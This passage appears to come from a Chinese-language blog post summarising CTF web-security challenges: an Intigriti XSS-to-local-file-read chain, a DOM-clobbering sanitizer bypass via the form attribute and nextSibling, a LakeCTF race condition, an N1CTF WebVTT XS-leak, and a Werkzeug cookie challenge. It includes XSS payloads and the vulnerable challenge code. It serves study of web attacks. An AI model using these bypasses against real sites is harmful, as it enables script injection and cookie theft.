弄掉，這邊最後是利用 <code>innerHTML</code> 會把屬性 decode 的特性，用 <code>&amp;sol;</code> 來取代 <code>/</code>，最後湊出這樣的 payload：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&lt;p id&#x3D;&quot;&lt;%26sol%3Btitle&gt;&lt;script&gt;alert()&lt;%26sol%3Bscript&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>這題的目標是要讀本地檔案，所以 XSS 是不夠的，下一步要想辦法從 XSS 繼續往下延伸。</p><p>這題的 flag 有 <code>--disable-web-security</code>，SOP 被關掉了，可以讀到其他來源的 response，而 CDP 有 origin 的限制沒辦法完全使用，但有部分功能可以，例如說開啟一個新網頁之類的。</p><p>但因為檔案在本地，所以只有 <code>file:///</code> 開頭的檔案可以讀到其他本地檔案，因此目標就變成要想辦法在本地弄出一個檔案。</p><p>解法是在新的 headless mode 中，下載功能是預設開啟的，所以只要觸發下載以後，就會把檔案存到固定規則的位置，用 CDP 打開以後即可。</p><p>作者 writeup：<a href="https://mizu.re/post/intigriti-october-2023-xss-challenge">https://mizu.re/post/intigriti-october-2023-xss-challenge</a></p><h2><span id="dom-clobbering">DOM clobbering</span></h2><p>來源：<a href="https://twitter.com/kevin_mizu/status/1697625861543923906">https://twitter.com/kevin_mizu/status/1697625861543923906</a></p><p>題目是一個自製的 sanitizer：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">Sanitizer</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// https://source.chromium.org/chromium/chromium/src/+/main:out/android-Debug/gen/third_party/blink/renderer/modules/sanitizer_api/builtins/sanitizer_builtins.cc;l=360</span>    <span class="token constant">DEFAULT_TAGS</span>  <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token comment">/* ... */</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">config<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>version <span class="token operator">=</span> <span class="token string">"2.0.0"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>creator <span class="token operator">=</span> <span class="token string">"@kevin_mizu"</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span>            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"head"</span><span class="token punctuation">,</span> <span class="token string">"body"</span> <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">tag</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_TAGS</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span> <span class="token operator">=</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span>            <span class="token operator">?</span> config<span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">attr</span> <span class="token operator">=></span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attr<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">DEFAULT_ATTRS</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L924</span>    <span class="token function-variable function">_isClobbered</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">elm</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>            elm <span class="token keyword">instanceof</span> <span class="token class-name">HTMLFormElement</span> <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span><span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>nodeName <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>textContent <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeChild <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token operator">!</span><span class="token punctuation">(</span>elm<span class="token punctuation">.</span>attributes <span class="token keyword">instanceof</span> <span class="token class-name">NamedNodeMap</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>removeAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>setAttribute <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">'string'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>insertBefore <span class="token operator">!==</span> <span class="token string">'function'</span> <span class="token operator">||</span>            <span class="token keyword">typeof</span> elm<span class="token punctuation">.</span>hasChildNodes <span class="token operator">!==</span> <span class="token string">'function'</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// https://github.com/cure53/DOMPurify/blob/48bd850cc20190e3896cb6291367c2da2ed2bddb/src/purify.js#L1028</span>    <span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>        <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>                    childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                    currentNode<span class="token punctuation">.</span>nextSibling                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function-variable function">sanitize</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">input</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> currentNode<span class="token punctuation">;</span>        <span class="token keyword">var</span> dom_tree <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parseFromString</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> nodeIterator <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createNodeIterator</span><span class="token punctuation">(</span>dom_tree<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>currentNode <span class="token operator">=</span> nodeIterator<span class="token punctuation">.</span><span class="token function">nextNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// avoid DOMClobbering</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">_isClobbered</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">typeof</span> currentNode<span class="token punctuation">.</span>nodeType <span class="token operator">!==</span> <span class="token string">"number"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">switch</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>nodeType<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">case</span> currentNode<span class="token punctuation">.</span><span class="token constant">ELEMENT_NODE</span><span class="token operator">:</span>                    <span class="token keyword">var</span> tag_name   <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>nodeName<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">var</span> attributes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>attributes<span class="token punctuation">;</span>                    <span class="token comment">// avoid mXSS</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>currentNode<span class="token punctuation">.</span>namespaceURI <span class="token operator">!==</span> <span class="token string">"http://www.w3.org/1999/xhtml"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token comment">// sanitize tags</span>                    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_TAGS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>tag_name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">continue</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token comment">// sanitize attributes</span>                    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> attributes<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">ALLOWED_ATTS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>attributes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">removeNode</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token keyword">continue</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> dom_tree<span class="token punctuation">.</span>body<span class="token punctuation">.</span>innerHTML<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>內容有參考許多其他的 sanitizer library，像是 DOMPurify 等等。</p><p>這題的關鍵是以往對於 form 的 DOM clobber，都是像這樣：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>理所當然地把元素放在 form 裡面，就可以污染 <code>test.x</code>。</p><p>但其實還有一招是使用 <code>form</code> 屬性，就可以把元素放在外面：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>這一題的 sanitizer 在移除元素時，是這樣做的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">removeNode</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">currentNode</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> parentNode <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>parentNode<span class="token punctuation">;</span>    <span class="token keyword">const</span> childNodes <span class="token operator">=</span> currentNode<span class="token punctuation">.</span>childNodes<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>childNodes <span class="token operator">&amp;&amp;</span> parentNode<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> childCount <span class="token operator">=</span> childNodes<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> childCount <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            parentNode<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span>                childNodes<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                currentNode<span class="token punctuation">.</span>nextSibling            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    currentNode<span class="token punctuation">.</span>parentElement<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>currentNode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把要刪除的元素底下的 node，都插入到 parent 的 nextSibling 去。</p><p>因此，如果 clobber 了 nextSibling，製造出這樣的結構：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">form</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nextSibling</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>test</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>nodeName</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>x</span> <span class="token special-attr"><span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span></span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就會在移除 <code>&lt;form&gt;</code> 時，把底下的節點都插入到 <code>&lt;input form=test name=nextSibling&gt;</code> 後面，藉此繞過 sanitizer。</p><p>真有趣的題目！雖然知道有 <code>form</code> 這個屬性，但還沒想過可以拿來搭配 DOM clobbering。</p><p>作者的 writeup：<a href="https://twitter.com/kevin_mizu/status/1701922141791211776">https://twitter.com/kevin_mizu/status/1701922141791211776</a></p><h2><span id="lakectf-2023-geoguessy">LakeCTF 2023 GeoGuessy</span></h2><p>來源是參考這篇 writeup：<a href="https://www.xanhacks.xyz/p/lakectf2023-geoguessy/">XSS, Race Condition, XS-Leaks and CSP &amp; iframe’s sandbox bypass - LakeCTF 2023 GeoGuessy</a></p><p>先來看兩個有趣的 unintended，第一個是利用 cookie 不看 port 的特性，用其他題目的 XSS 來拿到 cookie，不同題目之間如果沒有隔離好就會這樣，例如說 <a href="https://blog.maple3142.net/2023/08/27/sekai-ctf-2023-writeups/#leakless-note">SekaiCTF 2023 - leakless note</a> 也是。</p><p>第二個是寫 code 的 bad practice 造成的 race condition。</p><p>在訪問頁面時會去設定 user，這邊的 user 是 global variable：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>cookies<span class="token operator">?.</span>token<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         isPremium <span class="token operator">=</span> user<span class="token punctuation">.</span>isPremium        username <span class="token operator">=</span> user<span class="token punctuation">.</span>username        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> isPremium<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然後 update user 時也是用類似的模式，拿到 user 之後修改資料寫入：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/updateUser'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    token <span class="token operator">=</span> req<span class="token punctuation">.</span>cookies<span class="token punctuation">[</span><span class="token string">"token"</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        user <span class="token operator">=</span> <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">getUserBy</span><span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">,</span> token<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            enteredPremiumPin <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">[</span><span class="token string">"premiumPin"</span><span class="token punctuation">]</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>enteredPremiumPin <span class="token operator">==</span> premiumPin<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                user<span class="token punctuation">.</span>isPremium <span class="token operator">=</span> <span class="token number">1</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// ...</span>            <span class="token keyword">await</span> db<span class="token punctuation">.</span><span class="token function">updateUserByToken</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> user<span class="token punctuation">)</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'yes ok'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>admin bot 每次都會執行 updateUser，把 admin user 的 isPremium 設定成 1。</p><p>由於 user 是 global variable，db 的操作又是 async 的，所以如果速度夠快的話，updateUser 裡的 user 會是另一個 user，就可以把自己的 user 設定成 premium account。</p><p>intended 的話是用 Scroll to Text Fragment (STTF) 來解。</p><h2><span id="n1ctf-ytiruces">N1CTF - ytiruces</span></h2><p>參考資料：</p><ol><li><a href="https://dem0dem0.top/2023/10/20/n1ctf2023/">https://dem0dem0.top/2023/10/20/n1ctf2023/</a></li><li><a href="https://nese.team/posts/n1ctf2023/">https://nese.team/posts/n1ctf2023/</a></li></ol><p>用 WebVTT，一個顯示字幕的格式搭配 CSS selector  <code>video::cue(v[voice^=&quot;n1&quot;])</code> 來 xsleak。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/::cue">https://developer.mozilla.org/en-US/docs/Web/CSS/::cue</a></p><p>真是有趣的 selector。</p><h2><span id="werkzeug-cookie-parsing-quirks">Werkzeug cookie parsing quirks</span></h2><p>來源：<a href="https://mizu.re/post/another-html-renderer">Another HTML Renderer</a></p><p>這題又是來自於 <a href="https://twitter.com/kevin_mizu">@kevin_mizu</a>，前面已經有介紹過兩題他出的題目了，而這題又是一個有趣的題目！</p><p>這題有一個 admin bot 會設定 cookie，裡面有 flag，所以目標就是偷到這個 cookie，而核心程式碼如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/render"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    settings <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        settings <span class="token operator">=</span> loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span> <span class="token keyword">pass</span>    <span class="token keyword">if</span> settings<span class="token punctuation">:</span>        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span>            backgroundColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"backgroundColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"backgroundColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#ffde8c"</span><span class="token punctuation">,</span>            textColor<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"textColor"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"textColor"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">"#000000"</span><span class="token punctuation">,</span>            html<span class="token operator">=</span>settings<span class="token punctuation">[</span><span class="token string">"html"</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token string">"html"</span> <span class="token keyword">in</span> settings <span class="token keyword">else</span> <span class="token string">""</span>        <span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> backgroundColor<span class="token operator">=</span><span class="token string">"#ffde8c"</span><span class="token punctuation">,</span> textColor<span class="token operator">=</span><span class="token string">"#000000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"settings"</span><span class="token punctuation">,</span> <span class="token string">"&#123;&#125;"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Python 這邊主要會根據 cookie 內的參數來 render 頁面，template 如下：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span>  <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>render<span class="token punctuation">"</span></span>  <span class="token attr-name">sandbox</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span>  <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;style>* &#123; text-align: center; &#125;&lt;/style>&#123;&#123;html&#125;&#125;<span class="token 